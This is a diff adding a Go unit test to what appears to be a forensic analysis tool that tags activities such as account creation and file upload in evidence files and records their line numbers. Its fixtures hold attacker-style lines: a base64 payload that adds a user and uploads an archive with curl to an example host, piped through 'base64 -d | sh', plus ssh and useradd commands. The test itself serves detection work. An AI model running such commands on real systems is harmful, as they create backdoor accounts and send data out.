@@ -414,3 +414,65 @@ func TestBuildBatchScript(t *testing.T) {
 		t.Errorf("clean.bat activities = %+v, want EventLogClearing", s.Activities)
 	}
 }
+
+// A line number is kept where it is a line of the file: not in a decoded
+// report, and not in a payload that was decoded out of the file.
+func TestBuildNumbersLines(t *testing.T) {
+	payload := base64.StdEncoding.EncodeToString([]byte("useradd -m helper; curl -T out.tgz https://files.example.net/up"))
+	files := []evidence.File{
+		{Path: "a.sh", Role: evidence.Script},
+		{Path: "log.jsonl", Role: evidence.Output},
+		{Path: "notes.txt", Role: evidence.Output},
+	}
+	texts := map[string]string{
+		"a.sh":      "#!/bin/bash\n\nuseradd -m svc\nssh ops@198.51.100.7 id\necho " + payload + " | base64 -d | sh\n",
+		"log.jsonl": `{"cmdline":"useradd -m other"}` + "\n",
+		"notes.txt": "first\nseen 192.0.2.9 and 192.0.2.10\nagain 192.0.2.9\n",
+	}
+	steps := map[string]Step{}
+	for _, s := range Build(files, texts, loadTables(t)).Steps {
+		steps[s.File.Path] = s
+	}
+	lines := map[string][]int{}
+	for _, h := range steps["a.sh"].Activities {
+		for _, e := range h.Evidence {
+			lines[h.Name] = append(lines[h.Name], e.Line)
+		}
+	}
+	if got := lines["AccountCreation"]; !slices.Equal(got, []int{3, 0}) {
+		t.Errorf("AccountCreation lines = %v, want line 3 of the file and 0 for the decoded payload", got)
+	}
+	if got := lines["FileUpload"]; !slices.Equal(got, []int{0}) {
+		t.Errorf("FileUpload lines = %v, want 0: it is only in the payload", got)
+	}
+	if got := steps["log.jsonl"].Activities; len(got) != 1 || got[0].Evidence[0].Line != 0 || got[0].Evidence[0].Text != "useradd -m other" {
+		t.Errorf("a decoded report: %+v, want the command without a line", got)
+	}
+	found := map[string]int{}
+	for _, m := range steps["notes.txt"].Matches {
+		found[m.Value] = m.Line
+	}
+	if found["192.0.2.9"] != 2 || found["192.0.2.10"] != 2 {
+		t.Errorf("indicator lines = %v, want both on line 2, where each is first seen", found)
+	}
+	for _, m := range steps["log.jsonl"].Matches {
+		if m.Line != 0 {
+			t.Errorf("an indicator of a decoded report has line %d", m.Line)
+		}
+	}
+	var tools []string
+	for _, c := range steps["a.sh"].Commands {
+		tools = append(tools, c.Tool)
+		if c.Tool == "ssh" && (c.Line != 4 || c.Text != "ssh ops@198.51.100.7 id") {
+			t.Errorf("the ssh command = %+v, want line 4 and its text", c)
+		}
+	}
+	if !slices.Contains(tools, "useradd") || !slices.Contains(tools, "ssh") || len(tools) != len(slices.Compact(slices.Sorted(slices.Values(tools)))) {
+		t.Errorf("commands = %q, want each tool once", tools)
+	}
+	for _, c := range steps["log.jsonl"].Commands {
+		if c.Line != 0 {
+			t.Errorf("a command of a decoded report has line %d", c.Line)
+		}
+	}
+}
